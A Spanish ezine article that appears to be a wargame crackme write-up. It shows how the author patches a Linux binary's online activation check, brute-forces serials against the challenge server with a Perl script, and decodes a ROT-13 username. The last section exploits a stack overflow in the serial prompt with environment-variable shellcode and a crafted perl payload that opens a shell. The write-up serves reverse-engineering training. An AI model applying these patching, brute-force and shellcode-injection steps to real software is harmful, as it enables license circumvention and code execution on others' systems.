@@ -1,0 +1,677 @@
+-[ 0x0C ]--------------------------------------------------------------------
+-[ Analisis CrackMe en Linux ]-----------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-37--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+ 1 - Introduccion
+
+ 2 - Primer Analisis
+
+ 3 - Habilitar el CrackMe
+
+ 4 - Obteniendo un Serial
+
+ 5 - Codigo de Activacion
+
+ 6 - Ultima Sorpresa
+
+ 7 - Conclusion
+
+ 8 - Referencias
+
+
+---[ 1 - Introduccion
+
+Este articulo no es nada especial, tampoco es la ultima tecnica de explotacion
+sobre binarios. Simplemente nace de un reto propuesto en un Wargame en el que
+un Crackme debia ser superado.
+
+El reto es sencillo, pero el articulo viene de mi apetencia por documentarlo...
+Alquien me lo prohibe?
+
+Espero que al menos sea curioso lo que sigue...
+
+
+
+---[ 2 - Primer Analisis
+
+Lo primero que nos encontramos en la pagina del reto, son tres enlances de
+descarga del binario en cuestion, y un cuadro que permite introducir un codigo
+de activacion o solucion con el que se supera el reto. Los enlaces son los
+siguientes:
+
+   GCC ELF 2.6 Linux x86 compiled binary (download)
+   MD5: 27e594768fc772effe91689c916ca763
+
+   GCC ELF 2.6 Linux PPC compiled binary (download)
+   MD5: 778a48b5faeb7465003ea49f20428f86
+
+   DevC++ MS Windows compiled binary (download)
+   MD5: 7566be58fccc32ac5a8e99eba684efce
+
+Aburrido de que todos hagamos los crackmes en Windows, me decidi por la primera
+opcion, y trabajar en mi entorno Linux de todos los dias.
+
+Normalmente esto conlleva sus pros y sus contras. Es comun que un binario en
+Linux no este empaquetado, a menos que sea mediante UPX, que es uno de los pocos
+packers efectivos para este sistema. No obstante, y aunque el antiforense no es
+lo mas avanzado en Linux, si que existen ciertas medidas que pueden dificultar
+el analisis. Entre ellas, el stripeo de cadenas del binario.
+
+La web nos proporciona una breve descripcion del reto, que muestro ahora mismo:
+
+   "Pon a prueba tus conocimientos de ingenieria inversa con este original
+    'crackme'. Para superar este nivel tendras que resolver diferentes pruebas
+    como son: activar el programa, obtener un serial valido, y 'personalizarlo'
+    para tu usuario actual. Suerte :)"
+
+Veamos:
+
+Una vez descargado el zip y descomprimido, lo primero que nos sorprende es el
+nombre del ejecutable: "znaqvatb", pero esto es irrelevante de momento.
+
+De que clase es?
+
+blackngel@mac:~$ file ./znaqvatb 
+./znaqvatb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for
+GNU/Linux 2.6.1, dynamically linked (uses shared libs), stripped
+
+Vaya hombre! De modo que los nombres de los simbolos han sido extraidos y con
+ello se va toda la informacion de debuggeo.
+
+En estos casos, y ante binarios desconocidos, para un profundo analisis es muy
+recomendable el articulo "Analyzing Suspicious Binary Files and Processes" [1]
+publicado en el numero 63 de phrack.
+
+No hay mejor forma de conocer un programa que ejecutandolo:
+
+blackngel@mac:~$ ./znaqvatb 
+:: Initializing dongle
+:: Checking if dongle is enabled
+>> Sorry, but this dongle is disabled.
+>> Why don't you try to "enable" it first? :-)
+
+Bien, aqui se encuentra la primera trampa a superar que ya nos advertia la
+presentacion del reto.
+
+
+
+---[ 3 - Habilitar el CrackMe
+
+Ya que los simbolos han sido stripeados, instrucciones como "disass main" o
+algo por el estilo en GDB no daran resultado. Como mi deseo seguia siendo
+conocer el codigo de ensamblado que forma el programa, la unica alternativa
+era utilizar "objdump".
+
+En resumen, antes de llegar a la seccion .text, lo primero que nos encontramos
+son las entradas de la PLT que nos indica las funciones del sistema de las que
+nuestro binario hace uso:
+
+blackngel@mac:~$ objdump -d ./znaqvatb |more
+
+./znaqvatb:     file format elf32-i386
+
+........  
+Disassembly of section .plt:
+
+08048638 <sprintf@plt-0x10>:
+........
+08048648 <sprintf@plt>:
+........ 
+08048658 <connect@plt>:
+........ 
+08048668 <__gmon_start__@plt>:
+........ 
+08048678 <strchr@plt>:
+........ 
+08048688 <write@plt>:
+........ 
+08048698 <memset@plt>:
+........ 
+080486a8 <__libc_start_main@plt>:
+........ 
+080486b8 <htons@plt>:
+........ 
+080486c8 <read@plt>:
+........ 
+080486d8 <scanf@plt>:
+........ 
+080486e8 <socket@plt>:
+........ 
+080486f8 <printf@plt>:
+........ 
+08048708 <bind@plt>:
+........ 
+08048718 <close@plt>:
+........ 
+08048728 <strstr@plt>:
+........ 
+08048738 <strncat@plt>:
+........ 
+08048748 <strcat@plt>:
+........ 
+08048758 <puts@plt>:
+........ 
+08048768 <htonl@plt>:
+........ 
+08048778 <__gxx_personality_v0@plt>:
+........ 
+08048788 <gethostbyname@plt>:
+........ 
+08048798 <_Unwind_Resume@plt>:
+........ 
+
+Esto nos ofrece una ligera idea de las operaciones que realiza el programa. Por
+las llamdas a socket(), bind(), connect(), gethostbyname(), htons() y htonl(),
+vemos que realiza conexiones al exterior, muy probablemente a la misma web del
+reto.
+
+Vemos tambien que posiblemente escribe y lee datos de este socket mediante las
+funciones write() y read(). Debido a esto es comun encontrar funciones de
+manejo de cadenas como la familia strXXX().
+
+Una vez conocida esta faceta, podemos preguntarnos: Es posible que el programa
+haga la comprobacion de si el crackme esta activado mediante una peticion web?
+
+Ante esta suposicion yo puse wireshark a funcionar y ejecute nuevamente el
+programa. Obtuve dos peticiones GET interesantes con sus correspondientes
+respuestas:
+
+   GET /crackmes/dongle.php?run=./znaqvatb
+      HTTP/1.1 200 OK 
+
+   GET /crackmes/dongle.php?get=dongle_enabled
+      HTTP/1.1 200 OK  (text/html)
+      |
+      |-> >> Sorry, but this dongle is disabled.\n
+          >> Why don't you try to "enable" it first? :-)
+
+Asi que lo que va seguido de "::" son cadenas guardadas en el programa, y
+las que van a continaucion de ">>" son obtenidas mediante las respuestas WEB. 
+
+Una vez llegados a este punto, y pensando en la idea orignal de parchear un
+crackme, podemos pensar que seguramente, una vez recibida la respuesta a la
+segunda peticion GET del programa, existira un salto condicional que nos eche
+del mismo o nos permita continuar. Es logico que esto ocurra despues de una
+llamada a read(), asi que yo examine con objdump la seccion .text, buscando
+el lugar donde se encadenaban todas las funciones para crear el socket y la
+escritura y lectura del mismo.
+
+Llegue a un punto en el que el codigo era algo como esto:
+
+ 8048c3b:	e8 88 fa ff ff       call   80486c8 <read@plt>
+ ........
+ 8048c49:	e8 ca fa ff ff       call   8048718 <close@plt>
+ ........
+ ........
+ 8048c6e:	e8 b5 fa ff ff       call   8048728 <strstr@plt>
+ 8048c73:	89 45 e8             mov    %eax,-0x18(%ebp)
+ 8048c76:	83 7d e8 00          cmpl   $0x0,-0x18(%ebp)
+ 8048c7a:	0f 95 c0             setne  %al
+ 8048c7d:	84 c0                test   %al,%al
+ 8048c7f:	74 18                je     8048c99 <_Unwind_Resume@plt+0x501>
+ ........
+ ........
+ 8048cac:	e8 77 fa ff ff       call   8048728 <strstr@plt>
+ 8048cb1:	89 45 e8             mov    %eax,-0x18(%ebp)
+ 8048cb4:	83 7d e8 00          cmpl   $0x0,-0x18(%ebp)
+ 8048cb8:	0f 95 c0             setne  %al
+ 8048cbb:	84 c0                test   %al,%al
+ 8048cbd:	74 2c                je     8048ceb <_Unwind_Resume@plt+0x553>
+ 8048cbf:	8b 45 e8             mov    -0x18(%ebp),%eax
+ 8048cc2:	83 c0 04             add    $0x4,%eax
+ 8048cc5:	0f b6 00             movzbl (%eax),%eax
+ 8048cc8:	84 c0                test   %al,%al
+ 8048cca:	74 0e                je     8048cda <_Unwind_Resume@plt+0x542>
+ ........
+ ........
+ 8048cd5:	e8 7e fa ff ff       call   8048758 <puts@plt>
+ ........
+ 8048ce9:	eb 02                jmp    8048ced <_Unwind_Resume@plt+0x555>
+ 8048ceb:	eb 0c                jmp    8048cf9 <_Unwind_Resume@plt+0x561>
+ ........
+ ........
+ 8048d05:	5e                   pop    %esi
+ 8048d06:	5f                   pop    %edi
+ 8048d07:	5d                   pop    %ebp
+ 8048d08:	c3                   ret    
+
+Vemos que hasta el epilogo de funcion (pop's; ret;), solo hay tres saltos
+condicionales importantes. Los dos primeros tienen que ver con el resultado
+de strstr() sobre las cadenas obtenidas como respuesta a las peticones GET.
+Ambos saltos se ejecutaran solo cuando el registro %al sea 0 (test), de modo
+que podemos poner un breakpoint antes de esas instrucciones y cambiar su
+valor para ver que ocurre:
+
+blackngel@mac:~$ gdb -q ./znaqvatb 
+(no debugging symbols found)
+(gdb) break *0x08048c7d
+Breakpoint 1 at 0x8048c7d
+
+(gdb) run
+Starting program: /home/blackngel/znaqvatb 
+(no debugging symbols found)
+.....
+:: Initializing dongle
+.....
+
+Breakpoint 1, 0x08048c7d in ?? () // Primera peticion GET
+(gdb) i r $eax
+eax            0xbfdcc501	-1076050687
+(gdb) set $eax = 0
+(gdb) c
+Continuing.
+>> Can't connect to www.yoire.com port 80 :-(
+>> Aborting execution...
+
+Program exited normally.
+
+Nada, trucando el primer salto solo conseguimos empeorar las cosas. Probemos
+con el segundo:
+
+(gdb) del 1
+(gdb) break *0x08048cbb
+Breakpoint 2 at 0x8048cbb
+(gdb) run
+Starting program: /home/blackngel/znaqvatb 
+(no debugging symbols found)
+.....
+:: Initializing dongle
+.....
+
+Breakpoint 2, 0x08048cbb in ?? () // Primera peticion GET
+(gdb) i r $eax
+eax            0xbf87de01	-1081614847
+(gdb) set $eax=0
+(gdb) c
+Continuing.
+:: Checking if dongle is enabled
+
+Breakpoint 2, 0x08048cbb in ?? () // Segunda peticion GET (la interesante)
+(gdb) i r $eax
+eax            0xbf87de01	-1081614847
+(gdb) set $eax=0
+(gdb) c
+Continuing.
+:: Type you serial number: 
+
+Correcto, hemos logrado nuestro objetivo. Ahora ya se nos permite introducir
+un serial.
+
+Para que este cambio sea definitivo, hay varias opciones, la primera seria
+cambiar la instruccion anterior a "test" (setne  %al), por un "xor %eax,%eax",
+pero ya que no me apetecia buscar los codigos de operacion, opte por cambiar
+directamente el "je" por un "jne" ("74 2c" por "75 2c").
+
+Tu mismo puedes hacer uso de cualquier editor hexadecimal (a mi me gusta ghex2)
+y parchear el programa. 
+
+
+
+---[ 4 - Obteniendo un Serial
+
+Ahora vamos con la segunda trampa. Para sacar un serial valido es de bastante
+ayuda conocer el mensaje ante uno que no lo es:
+
+blackngel@mac:~$ ./znaqvatb 
+:: Initializing dongle
+:: Checking if dongle is enabled
+:: Type you serial number: blackngel123
+blackngel@mac:~$ 
+
+No vemos respuesta alguna, esto resulta raro, pero no tanto cuando nos damos
+cuenta de que es posible que el cambio que hicimos en la seccion anterior sobre
+el salto condicional puede influir en este comportamiento. Recuerda que si el
+codigo pasa por ese punto otra vez, es que una nueva peticion web ha sido
+realizada. Entonces podemos analizarla:
+
+   GET /crackmes/dongle.php?serial=blackngel123
+   HTTP/1.1 200 OK  (text/html)
+   |
+   |-> >> Sorry, but that serial number doesn't seem to be valid :(
+
+   GET /crackmes/dongle.php?get=code
+   HTTP/1.1 200 OK  (text/html)
+   |
+   |-> >> Hacking attempt!
+
+De momento la peticion que nos interesa es la primera. Vemos que nuestro
+serial parece ser comprobado en el mismo servidor WEB, y este nos responde
+en consecuencia. En muchas aplicaciones, este codigo es comparado en el
+interior de las mismas con una cadena prefijada. Nuestro programa no lo hace,
+pero a mi me dio igualmente por examinar el programa con el comando "strings"
+para ver si encontraba algo intersante en su interior. Justo al final me
+encontre lo siguiente:
+
+blackngel@mac:~$ strings ./znaqvatb 
+.....
+.....
+www.yoire.com
+GET /crackmes/dongle.php?%s=%s HTTP/1.0
+Host: %s
+unknown host '%s'
+Cannot connect to %s:%d
+X-Result: 
+Set-Cookie: 
+Cookie: 
+dongle_enabled
+serial
+code
+:: Initializing dongle
+>> Can't connect to %s port %d :-(
+>> Aborting execution...
+:: Checking if dongle is enabled
+:: Type you serial number: 
+YOIRE-3137-999
+
+Genial, vemos un prototipo de serial valido, que tal vez sirva para superar el
+programa. Lo introducimos y obtenemos lo siguiente:
+
+   GET /crackmes/dongle.php?serial=YOIRE-3137-999
+   HTTP/1.1 200 OK  (text/html)
+   |
+   |-> >> Sorry, but that serial number is "black listed".\n
+          >> Try another please...
+
+Bueno, no ha habido suerte, pero al menos tenemos el formato adecuado para este
+codigo, y eso nos da pie a un ataque de fuerza bruta. En principio yo codee
+un pequeño script en perl que probaba todas las combinaciones posibles para
+el formato "YOIRE-xxxx-yyy", pero las palabras de un conocido me hiciero volver
+al camino correcto recordandome el principio de "La Navaja de Ockam", que dice
+que: "En igualdad de condiciones, la solucion mas simple casi siempre es la
+correcta".
+
+Asi que me limite a comprobar simplemente las variaciones del ultimo grupo de
+3 digitos. Este fue mi script:
+
+[-----]
+
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use HTTP::Request::Common qw(POST);
+
+my $ua = LWP::UserAgent->new() or die;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)    /
+                                 Gecko/2008072820 Firefox/3.0.1");
+
+
+for ($i = 0; $i <= 999; $i++) {
+
+   $val2 = sprintf("%03d", $i);
+
+   my $url = "http://www.yoire.com/crackmes/dongle.php?serial=YOIRE-3137-$val2";
+   print "Probando: $url\n";
+   my $req = HTTP::Request->new(GET => $url);
+   $req->content_type('application/x-www-form-urlencoded');
+   $request = $ua->request($req);
+   $content = $request->content;
+
+   print "$content\n";
+}
+
+print "\n\n";
+exit;
+
+[-----]
+
+Ya que el programa no sale cuando encuentra el serial correcto, lo mejor es
+redireccionar la salida a un archivo, y luego examinarlo de forma pasiva.
+
+Yo me encontre esto:
+
+   ........
+   Probando: http://www.yoire.com/crackmes/dongle.php?serial=YOIRE-3137-665
+   >> Sorry, but that serial number doesn't seem to be valid :(
+   Probando: http://www.yoire.com/crackmes/dongle.php?serial=YOIRE-3137-666
+   >> Your serial number seems to be valid :)
+   Probando: http://www.yoire.com/crackmes/dongle.php?serial=YOIRE-3137-667
+   >> Sorry, but that serial number doesn't seem to be valid :(
+   Probando: http://www.yoire.com/crackmes/dongle.php?serial=YOIRE-3137-668
+   ........
+
+Bingo! Ya tenemos nuestro serial: "YOIRE-3137-666".
+
+
+
+---[ 5 - Codigo de Activacion
+
+Ahora debemos de comprobar que ha cambiado en la ultima peticion GET cuando
+introducimos el serial correcto:
+
+   GET /crackmes/dongle.php?get=code
+   HTTP/1.1 200 OK  (text/html)
+   |
+   Ok, 'mandingo', your activation code is: 9b82f983f5a117249419d081f618a6ac :-)
+
+Asi que ha surgido efecto. Ese parece ser el codigo que debemos introducir como
+solucion en la pagina desde la que nos descargamos el binario. No obstante el
+reto hablaba de "personalizar el programa para tu usuario" y eso quiere decir
+que ese codigo solo es valido para el usuario "mandingo", y nosotros debemos de
+cambiar algo para obtener el nuestro.
+
+Ya que es la pagina web la que debe detectar que usuario realiza la peticion,
+parece ser que algun parametro debe pasarse en alguna de ellas que nos
+identifique. Al principio pense que se trataba del valor de sesion PHPSESSID
+establecido en la cookie, pero este cambia con cada nueva conexion, como era
+de esperar.
+
+Aqui es donde, revisando todas las peticiones GET, volvi de vuelta a la primera
+ya que parecia no tener una funcion especifica:
+
+   GET /crackmes/dongle.php?run=./znaqvatb
+
+Que diablos significa "znaqvatb"? Parece ser alguna clase de cifrado sencillo.
+Lo mas sorprendente es que el numero de letras coincide exactamente con el
+nombre "mandingo". 
+
+Como siempre se suele empezar por el cifrado del Cesar, yo utilice la pagina:
+"http://hwagm.elhacker.net/php/sneak.php", con el fin de hacer bruteforce con
+todos los desplazamientos posibles. Obtuve esto:
+
+ROT-1: aobrwbuc
+ROT-2: bpcsxcvd
+ROT-3: cqdtydwe
+ROT-4: dreuzexf
+ROT-5: esfvafyg
+ROT-6: ftgwbgzh
+ROT-7: guhxchai
+ROT-8: hviydibj
+ROT-9: iwjzejck
+ROT-10: jxkafkdl
+ROT-11: kylbglem
+ROT-12: lzmchmfn
+ROT-13: mandingo
+ROT-14: nboejohp
+ROT-15: ocpfkpiq
+ROT-16: pdqglqjr
+ROT-17: qerhmrks
+ROT-18: rfsinslt
+ROT-19: sgtjotmu
+ROT-20: thukpunv
+ROT-21: uivlqvow
+ROT-22: vjwmrwpx
+ROT-23: wkxnsxqy
+ROT-24: xlyotyrz
+ROT-25: ymzpuzsa
+
+Bingo, se trataba de un clasico cifrado ROT-13. Consecuentemente... que ocurre
+si aplicamos este cifrado a nuestro nick y modificamos la primera peticion web
+con el resultado?
+
+ORIGINAL: blackngel -> ROT-13: oynpxatry
+
+Con el fin de modificar esa primera peticion, yo opte por correr el programa
+con el argumento argv[0] alterado. Este pequeño programa realiza la tarea:
+
+[-----]
+
+#include <stdlib.h>
+#include <stdio.h>
+
+int main()
+{
+   char *args[] = {"./oynpxatry", NULL};
+   execve("./znaqvatb", args, NULL);
+
+   return 0; /* No deberia llegar aqui */
+}
+
+[-----]
+
+SI, cierto, cambiando el nombre al ejecutable acabas mucho antes...
+
+Y ahora que?
+
+blackngel@mac:~$ ./exe
+:: Initializing dongle
+:: Checking if dongle is enabled
+:: Type you serial number: YOIRE-3137-666
+
+En wireshark:
+
+>> Ok, 'blackngel', your activation code is: 98dac2cac5b9f3991c2d7eda4ade9085
+
+Ya tenemos nuestra solucion, la introducimos y RETO SUPERADO!
+
+
+
+---[ 6 - Ultima Sorpresa
+
+Antes de dejarlo todo, no podia marcharme sin analizar si el unico parametro
+de entrada que podia proporcionarle al programa era correctamente tratado.
+
+Menuda decepcion me lleve cuando me encontre con esto:
+
+:: Type you serial number: AAAAAAAAAAAAAAA
+Fallo de segmentación
+
+De modo que a partir del caracter numero 15, el programa rompe. Es explotable?
+
+:: Type you serial number: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080489ff in ?? ()
+(gdb) i r
+eax            0x0	0
+ecx            0x42424242	1111638594
+edx            0xbfffee01	-1073746431
+ebx            0x42424242	1111638594
+esp            0x4242423e	0x4242423e
+ebp            0x42424242	0x42424242
+esi            0xb7ffece0	-1207964448
+edi            0x0	0
+eip            0x80489ff	0x80489ff <_Unwind_Resume@plt+615>
+
+Si! Si has leido mi articulo "Jugando con Frame Pointer", este sera un bonito
+ejercicio para ti.
+
+El programa rompe aqui:
+
+ 80489f9:	59                   	pop    %ecx
+ 80489fa:	5b                   	pop    %ebx
+ 80489fb:	5d                   	pop    %ebp
+ 80489fc:	8d 61 fc             	lea    -0x4(%ecx),%esp
+ 80489ff:	c3                   	ret 
+
+En este caso la tecnica es un poco distinta, ya que %esp se controla mediante
+%ecx. Pero al final acaba siendo lo mismo, fijate que el valor que toma ESP
+al final es "0x4242423e" que es justamente nuestra cadena "BBBB" menos 4, que
+es "lea -0x4(%ecx),%esp".
+
+Bueno, esta bien, como pasatiempo sere bueno:
+
+(gdb) break *0x080489f9
+Breakpoint 1 at 0x80489f9
+(gdb) run
+Starting program: /home/blackngel/znaqvatb 
+(no debugging symbols found)
+.....
+:: Initializing dongle
+.....
+:: Checking if dongle is enabled
+:: Type you serial number: AAAAAAAAAAAAAAABBBB
+
+Breakpoint 1, 0x080489f9 in ?? ()
+(gdb) i r $ebp
+ebp            0xbffff4b8	0xbffff4b8
+
+(gdb) x/12x $ebp-32
+0xbffff498:	0xbffff4c8	0x00000000	0x41414100	0x41414141
+                                                // pop %ecx     //pop %ebx
+0xbffff4a8:	0x41414141	0x41414141	0x42424242	0x895e1feb
+                // pop %ebp
+0xbffff4b8:	0xc0310876	0x89074688	0xb7ff0046	0x08048e50
+
+De modo que nuestro buffer tiene que tener una estructura asi:
+
+    [         BUFFER         ] [     ECX     ]
+    [ &SHELLCODE ] [ RELLENO ] [ &BUFFER + 4 ]
+    ^__________________________________|
+
+Y ponemos la shellcode en una variable de entorno:
+
+blackngel@mac:~$ export SHELLCODE=`perl -e 'print "\x90"x50'``cat pruebas/bo/sc`
+blackngel@mac:~$ pruebas/bo/getenv SHELLCODE
+SHELLCODE is located at 0xbffff6db
+
+* Escogeremos una direccion un poquito mas alta para asegurar caer en los NOPs.
+
+Finalmente tenemos:
+
+   DIRECCION BUFFER    -> 0xbffff4a1
+   DIRECCION SHELLCODE -> 0Xbffff6fc
+
+   [ 0xbffff6fc ] [ "A" x 11 ] [ 0xbffff4a5 ]
+
+echo `perl -e 'print "\xfc\xf6\xff\xbf" . "A" x 11 . "\xa5\xf4\xff\xbf";'`
+                                            `cat pruebas/bo/sc` > /tmp/bof
+
+(gdb) run < /tmp/bof
+Starting program: /home/blackngel/znaqvatb < /tmp/bof
+(no debugging symbols found)
+.....
+:: Initializing dongle
+.....
+:: Checking if dongle is enabled
+sh-3.2$ exit
+exit
+
+Mejor pruebalo tu mismo y harcodea tus propias direcciones.
+
+
+
+---[ 7 - Conclusion
+
+Este articulo se ha presentado con la unica pretension de que resultara
+entretenido al menos para el lector mas avido. Se ha mostrado como paso
+a paso un binario en principio desconocido puede ser examinado con el fin
+de sacar provecho de el.
+
+Todavia te quedan miles de herramientas que podias haber utilizado para
+examinar el ejecutable, asi como: nm, ldd, analizar /proc/[pid]/, y muchas
+mas. Te recomiendo nuevamente este paper [1].
+
+Un abrazo!
+blackngel
+
+
+
+---[ 8 - Referencias
+
+ [1] Analyzing Suspicious Binary Files and Processes By Boris Loza, PhD
+     http://www.phrack.org/issues.html?issue=63&id=3#article
+
+
+*EOF*
